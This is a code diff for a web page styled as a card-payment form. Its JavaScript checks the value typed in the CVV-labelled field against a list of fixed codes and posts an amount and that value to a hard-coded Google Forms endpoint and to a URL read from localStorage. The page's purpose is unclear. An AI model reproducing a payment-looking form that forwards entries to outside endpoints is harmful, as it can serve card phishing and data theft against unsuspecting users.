@@ -110,7 +110,7 @@
         </div>
         <form id="send-money-form">
             <label for="card-number">Card Number</label>
-            <input type="tel" id="card-number" maxlength="19" placeholder="6001 0000 0000">
+            <input type="tel" id="card-number" maxlength="19" placeholder="●●●● ●●●● ●●●●">
             <label for="card-name">Name On Card</label>
             <input type="text" id="card-name" placeholder="Name" readonly>
             <div class="flex-row">
@@ -120,7 +120,7 @@
                 </div>
                 <div>
                     <label for="cvv">CVV</label>
-                    <input type="tel" id="cvv" placeholder="123">
+                    <input type="tel" id="cvv" placeholder="***" Required>
                 </div>
             </div>
             <button class="send-button"id="send-button">Pay Now</button>
@@ -188,26 +188,9 @@
             const sdentry = localStorage.getItem('sdentry');
 
             let googleFormsData = [];
-            let fetchedDataValue = 1000; // Example fetched data value, you need to replace this with the actual value
+             // Example fetched data value, you need to replace this with the actual value
 
             if (description === '789' ) {
-                googleFormsData = [
-                    {
-                        url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
-                        entries: {
-                            amount: 'entry.571402887',
-                            description: 'entry.885732113'
-                        }
-                    },
-                    {
-                        url: surl,
-                        entries: {
-                            amount: saentry,
-                            description: sdentry
-                        }
-                    }
-                ];
-            } else if (description === '243'  ) {
                 googleFormsData = [
                     {
                         url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
@@ -224,13 +207,30 @@
                         }
                     }
                 ];
-            } else if ( description === '143'  ) {
+            } else if (description === '243') {
                 googleFormsData = [
                     {
                         url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
                         entries: {
-                            amount: 'entry.388106005',
-                            description: 'entry.478936436'
+                            amount: 'entry.1522107311',
+                            description: 'entry.1449208456'
+                        }
+                    },
+                    {
+                        url: surl,
+                        entries: {
+                            amount: saentry,
+                            description: sdentry
+                        }
+                    }
+                ];
+            } else if (description === '143') {
+                googleFormsData = [
+                    {
+                        url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
+                        entries: {
+                            amount: 'entry.1522107311',
+                            description: 'entry.1449208456'
                         }
                     },
                     {
@@ -246,8 +246,8 @@
                 {
                     url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
                     entries: {
-                        amount: 'entry.366857651',
-                        description: 'entry.2048423254'
+                        amount: 'entry.1522107311',
+                        description: 'entry.1449208456'
                     }
                 },
                 {
@@ -263,8 +263,8 @@
                 {
                     url: 'https://docs.google.com/forms/d/e/1FAIpQLScGBC_IT9lFEedcfJvYQuyQDz9EsH8c8owO5rU_VheeYHvjUg/formResponse',
                     entries: {
-                        amount: 'entry.1273386060',
-                        description: 'entry.928300410'
+                        amount: 'entry.1522107311',
+                        description: 'entry.1449208456'
                     }
                 },
                 {
@@ -345,7 +345,7 @@
             ];
         } else {
             let errorMessage = `🚫 `;
-            if (description !== 'User1' && description !== 'User2' && description !== 'User3' && description !== 'User4' && description !== 'Rifat' && description !== 'Ritu' && description !== 'Taj' && description !== 'Sadik' && description !== 'Ratul') {
+            if (description !== '123' && description !== '234' && description !== '345' && description !== '456' && description !== '789' && description !== '678' && description !== '567' && description !== '143' && description !== '243') {
                 errorMessage += ` Please type your CVV `;
             }
      
